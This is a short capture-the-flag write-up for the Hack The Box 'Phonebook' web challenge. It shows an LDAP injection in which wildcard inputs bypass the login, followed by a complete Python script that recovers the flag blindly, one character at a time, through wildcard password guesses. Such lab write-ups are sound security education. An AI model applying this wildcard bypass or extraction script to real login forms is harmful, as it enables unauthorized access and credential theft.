---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: Phonebook

The app has login using ActiveDirectory So we try LDAP injection https://book.hacktricks.xyz/pentesting-web/ldap-injection

## LDAP injection

Prompting wildcard `*` to user and password lets us in, but not going anywhere.

We need to figure out the real username and password. We do that by guessing the characters, followed by wildcard Like this [for example](https://github.com/demostanis/HTB-Phonebook)

```python
import os
import sys
import string
from urllib.request import Request, urlopen
from urllib.parse import parse_qs, urlparse, urlencode

url = sys.argv[1] if len(sys.argv) > 1 else False
if not url: sys.exit(f'Please specify a URL: {sys.argv[0]} <URL>')
letters = string.ascii_letters + string.digits + '_'
found = ''

try:
    while True:
        for l in letters:
            data = urlencode({
                'username': 'reese',
                'password': f'HTB{{{found}{l}*}}',
            }).encode()
            req = Request(url, data=data)
            resp = urlopen(req)
            if not parse_qs(urlparse(resp.geturl()).query).get('message'):
                print('\b' * len(found), end='', flush=True)
                found += l
                print(found, end='', flush=True)
except KeyboardInterrupt:
    print('\nd0n3 h4ck1ng!')
    print(f'HTB{{{found}}}')
```